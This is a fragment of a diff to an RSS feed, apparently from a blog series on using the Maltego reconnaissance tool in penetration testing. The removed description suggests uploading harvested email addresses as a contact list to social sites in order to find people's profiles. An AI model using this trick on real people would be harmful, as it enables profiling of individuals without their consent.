-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Rapleaf and Spock Search (Social Networking search)&lt;/strong&gt;: If you don’t get anything right of the bat, try again later. These services index items on request so if you are the first one to query and email address or phrase, it might take 20 minutes to index and be ready with results. Also, have you ever added your friends to a social networking site via your address book or contacts list (IM/Webmail/Outlook)? Well what if your address book that you uploaded as a search included every email address or phrase that you have found in Maltego? &lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;We have now gotten the basics and the building blocks, next we go into the Human Factor. Sort of like a OCD instructor I will be helping you to make leaps of faith based on logic that Maltego, or any automated system for that matter, just can’t do.&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-</description>
+      <description>Now that you have had some time to play around with Community Edition or if you were lucky (or rich) enough, the Full version. We are going to start delving into the the pieces of Maltego and then in Part 5 we rip it apart and put it back together for PT-TAS (Penetration Testing - Transform Application Server). I am going to say “investigation” a lot in the coming paragraphs and parts of this article.</description>
     </item>
     
   </channel>
